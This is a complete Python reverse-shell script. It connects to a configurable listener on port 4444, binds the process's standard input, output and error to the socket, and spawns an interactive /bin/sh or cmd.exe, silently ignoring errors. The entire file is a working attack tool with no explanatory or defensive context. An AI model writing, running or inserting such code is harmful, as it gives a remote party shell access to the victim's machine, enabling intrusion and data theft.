import socket
import subprocess
import os

# Configuration
SERVER_IP = '127.0.0.1'  # Replace with your listener's IP
PORT = 4444

def start_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((SERVER_IP, PORT))
        
        # Redirect standard input, output, and error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # Launch the interactive shell
        # Use 'cmd.exe' for Windows or '/bin/sh' for Linux
        shell = 'cmd.exe' if os.name == 'nt' else '/bin/sh'
        subprocess.call([shell, "-i"])
    except Exception as e:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    start_shell()
